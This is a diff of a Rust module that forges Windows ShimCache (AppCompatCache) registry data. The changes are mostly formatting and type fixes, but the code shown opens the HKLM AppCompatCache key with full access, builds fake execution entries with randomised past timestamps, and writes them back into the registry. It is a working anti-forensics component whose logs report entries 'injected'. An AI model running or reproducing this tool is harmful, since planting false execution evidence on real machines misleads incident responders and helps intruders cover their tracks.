@@ -3,18 +3,16 @@
 // Value name: AppCompatCache (REG_BINARY)
 // Format: Win10 1607+ binary layout (entry_size, data_size, FILETIME, path_len, path[]).
 
-#![cfg(target_os = "windows")]
-
-use windows_sys::Win32::System::Registry::{
-    RegCreateKeyExW, RegQueryValueExW, RegSetValueExW, RegCloseKey,
-    HKEY_LOCAL_MACHINE, REG_BINARY, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS,
-};
-use windows_sys::Win32::Foundation::ERROR_SUCCESS;
 use std::ptr;
+use windows_sys::Win32::Foundation::ERROR_SUCCESS;
+use windows_sys::Win32::System::Registry::{
+    RegCloseKey, RegCreateKeyExW, RegQueryValueExW, RegSetValueExW, HKEY, HKEY_LOCAL_MACHINE,
+    KEY_ALL_ACCESS, REG_BINARY, REG_OPTION_NON_VOLATILE,
+};
 
 // Windows FILETIME: 100-ns intervals since 1601-01-01
 fn unix_to_filetime(ts: i64) -> u64 {
-    (ts + 11_644_473_600) * 10_000_000
+    ((ts + 11_644_473_600) * 10_000_000) as u64
 }
 
 fn to_wide(s: &str) -> Vec<u16> {
@@ -25,24 +23,29 @@ fn to_wide(s: &str) -> Vec<u16> {
 
 struct Lcg(u64);
 impl Lcg {
-    fn new(seed: i64) -> Self { Lcg(seed as u64 ^ 0xcafe_babe_5678_90ab) }
+    fn new(seed: i64) -> Self {
+        Lcg(seed as u64 ^ 0xcafe_babe_5678_90ab)
+    }
     fn next(&mut self) -> u64 {
-        self.0 = self.0.wrapping_mul(6_364_136_223_846_793_005)
-                       .wrapping_add(1_442_695_040_888_963_407);
+        self.0 = self
+            .0
+            .wrapping_mul(6_364_136_223_846_793_005)
+            .wrapping_add(1_442_695_040_888_963_407);
         self.0
     }
-    fn range(&mut self, lo: u64, hi: u64) -> u64 { lo + (self.next() % (hi - lo)) }
+    fn range(&mut self, lo: u64, hi: u64) -> u64 {
+        lo + (self.next() % (hi - lo))
+    }
 }
 
 // ── Registry access ───────────────────────────────────────────────────────────
 
-const APPCACHE_KEY: &str =
-    r"SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache";
+const APPCACHE_KEY: &str = r"SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache";
 const APPCACHE_VALUE: &str = "AppCompatCache";
 
-fn open_or_create_key() -> Option<isize> {
+fn open_or_create_key() -> Option<HKEY> {
     let key_w = to_wide(APPCACHE_KEY);
-    let mut hkey: isize = 0;
+    let mut hkey: HKEY = ptr::null_mut();
     let mut disposition: u32 = 0;
     let ret = unsafe {
         RegCreateKeyExW(
@@ -57,10 +60,14 @@ fn open_or_create_key() -> Option<isize> {
             &mut disposition,
         )
     };
-    if ret == ERROR_SUCCESS as i32 { Some(hkey) } else { None }
+    if ret == ERROR_SUCCESS {
+        Some(hkey)
+    } else {
+        None
+    }
 }
 
-fn read_existing_value(hkey: isize) -> Option<Vec<u8>> {
+fn read_existing_value(hkey: HKEY) -> Option<Vec<u8>> {
     let name_w = to_wide(APPCACHE_VALUE);
     let mut data_size: u32 = 0;
     let mut reg_type: u32 = 0;
@@ -76,7 +83,9 @@ fn read_existing_value(hkey: isize) -> Option<Vec<u8>> {
             &mut data_size,
         )
     };
-    if ret != ERROR_SUCCESS as i32 || data_size == 0 { return None; }
+    if ret != ERROR_SUCCESS || data_size == 0 {
+        return None;
+    }
 
     let mut buf = vec![0u8; data_size as usize];
     let ret = unsafe {
@@ -89,10 +98,14 @@ fn read_existing_value(hkey: isize) -> Option<Vec<u8>> {
             &mut data_size,
         )
     };
-    if ret == ERROR_SUCCESS as i32 { Some(buf) } else { None }
+    if ret == ERROR_SUCCESS {
+        Some(buf)
+    } else {
+        None
+    }
 }
 
-fn write_value(hkey: isize, data: &[u8]) -> bool {
+fn write_value(hkey: HKEY, data: &[u8]) -> bool {
     let name_w = to_wide(APPCACHE_VALUE);
     let ret = unsafe {
         RegSetValueExW(
@@ -104,7 +117,7 @@ fn write_value(hkey: isize, data: &[u8]) -> bool {
             data.len() as u32,
         )
     };
-    ret == ERROR_SUCCESS as i32
+    ret == ERROR_SUCCESS
 }
 
 // ── AppCompatCache binary format ──────────────────────────────────────────────
@@ -139,7 +152,9 @@ fn build_entry(path: &str, last_mod: i64) -> Vec<u8> {
     e.extend_from_slice(&data_size.to_le_bytes());
     e.extend_from_slice(&unix_to_filetime(last_mod).to_le_bytes());
     e.extend_from_slice(&path_bytes.to_le_bytes());
-    for &wc in &wpath { e.extend_from_slice(&wc.to_le_bytes()); }
+    for &wc in &wpath {
+        e.extend_from_slice(&wc.to_le_bytes());
+    }
     e
 }
 
@@ -188,24 +203,26 @@ const FAKE_PATHS: &[&str] = &[
 
 pub struct ShimcacheForgeOpts {
     pub n_entries: u32,
-    pub ts_base:   i64,
-    pub verbose:   bool,
+    pub ts_base: i64,
+    pub verbose: bool,
 }
 
 #[derive(Default)]
 pub struct ShimcacheForgeStats {
     pub entries_injected: u32,
-    pub errors:           u32,
+    pub errors: u32,
 }
 
 pub fn forge_shimcache(opts: &ShimcacheForgeOpts) -> ShimcacheForgeStats {
-    let mut s   = ShimcacheForgeStats::default();
+    let mut s = ShimcacheForgeStats::default();
     let mut lcg = Lcg::new(opts.ts_base);
 
     let hkey = match open_or_create_key() {
         Some(k) => k,
         None => {
-            if opts.verbose { eprintln!("[!] forge-shimcache: failed to open registry key"); }
+            if opts.verbose {
+                eprintln!("[!] forge-shimcache: failed to open registry key");
+            }
             s.errors += 1;
             return s;
         }
@@ -218,10 +235,9 @@ pub fn forge_shimcache(opts: &ShimcacheForgeOpts) -> ShimcacheForgeStats {
     // Build fake entries (most recent first = prepended)
     let n = opts.n_entries.min(FAKE_PATHS.len() as u32) as usize;
     let mut new_entries: Vec<u8> = Vec::new();
-    for i in 0..n {
-        let path       = FAKE_PATHS[i];
-        let offset     = lcg.range(0, 30 * 86_400) as i64; // up to 30 days back
-        let last_mod   = opts.ts_base - offset;
+    for &path in FAKE_PATHS.iter().take(n) {
+        let offset = lcg.range(0, 30 * 86_400) as i64; // up to 30 days back
+        let last_mod = opts.ts_base - offset;
         new_entries.extend_from_slice(&build_entry(path, last_mod));
         s.entries_injected += 1;
     }
@@ -237,12 +253,17 @@ pub fn forge_shimcache(opts: &ShimcacheForgeOpts) -> ShimcacheForgeStats {
 
     if write_value(hkey, &value) {
         if opts.verbose {
-            eprintln!("[+] forge-shimcache: {} entries injected ({} bytes total)",
-                s.entries_injected, value.len());
+            eprintln!(
+                "[+] forge-shimcache: {} entries injected ({} bytes total)",
+                s.entries_injected,
+                value.len()
+            );
         }
     } else {
         s.errors += 1;
-        if opts.verbose { eprintln!("[!] forge-shimcache: failed to write registry value"); }
+        if opts.verbose {
+            eprintln!("[!] forge-shimcache: failed to write registry value");
+        }
     }
 
     unsafe { RegCloseKey(hkey) };
